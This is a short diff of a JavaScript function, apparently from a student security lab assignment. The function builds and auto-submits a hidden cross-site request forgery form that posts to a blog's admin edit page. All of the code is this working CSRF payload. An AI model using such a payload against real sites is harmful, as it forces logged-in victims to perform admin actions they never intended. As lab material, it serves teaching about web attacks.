@@ -15,7 +15,7 @@ function CSRF() {
 	//create a <form> element.
 	var form = document.createElement('form');
 	//construct the form
-	form.action = "https://akpan1.myblog.com/admin/index.php";
+	form.action = "https://akpan1.myblog.com/admin/edit.php";
 	form.method = 'POST';
 	form.target = '_self';
 	form.innerHTML = "<input type='hidden' name='title' value='CSRF Attack Post - Assignment 2' />" +
@@ -24,7 +24,7 @@ function CSRF() {
 	document.body.appendChild(form);
 	//just for the lab report, to capture the screenshot, otherwise, the CSRF 
 	//will be submitted automatically
-	alert('**CSRF Attack for Assignment2 is about to happen - By Akpans1');
+	alert('CSRF Attack for Assignment2 is about to happen - By Akpans1');
 	//submit the form
 	form.submit();
 }
